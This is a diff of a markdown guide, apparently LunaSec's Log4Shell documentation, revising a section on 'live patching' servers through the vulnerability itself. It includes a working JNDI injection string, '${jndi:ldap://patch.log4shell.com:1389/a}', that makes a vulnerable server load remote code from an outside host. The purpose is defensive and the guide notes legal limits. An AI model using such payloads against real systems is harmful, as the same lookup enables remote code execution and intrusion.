@@ -306,12 +306,19 @@ Because of the extensive control Log4Shell gives an attacker, it's actually poss
 This isn't the recommended strategy for various reasons, but it could be a last resort for systems that you can't easily restart or modify.  Note that doing this on a system 
 you don't have permission to is most likely illegal. The fix will only work until the server (or the JVM) is restarted.
 
-You use our hosted version here to patch yourself:
+We've published articles about this exploit that you can use to learn more about how it works.
+- **[Overview (When to use it)](https://www.lunasec.io/docs/blog/log4shell-live-patch/)**,
+- **[Technical Deep-dive](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical)**
+
+#### Hosted Exploit Payload
+
 ```
 ${jndi:ldap://patch.log4shell.com:1389/a}
 ```
 
-Just simply paste that anywhere into your server where you're vulnerable, and it will work. (For example, in the `main` function when you start up your server)
+Just simply paste that anywhere into your server where you're vulnerable, and it will patch you against future
+exploitation. (For example, in the `main` function when you start up your server, or a known vulnerable field if it's
+a vendor product you depend on.)
 
 We have added this functionality to the [latest release](https://github.com/lunasec-io/lunasec/releases) of our
 Log4Shell CLI tool if you'd prefer to run the server yourself instead.
@@ -324,8 +331,6 @@ until you can apply a more permanent patch for Log4Shell.
 If you need a permanent solution for Log4Shell, please check out our commercial
 [Live Patch service](https://www.lunasec.io/pages/live-dependency-patching) for a production-ready alternative.
 :::
-
-How it works and how to accomplish it manually is explained in [this guide](https://github.com/Cybereason/Logout4Shell). Our implementation is based on the work they did.
 
 ## How to protect yourself from future 0-days
 
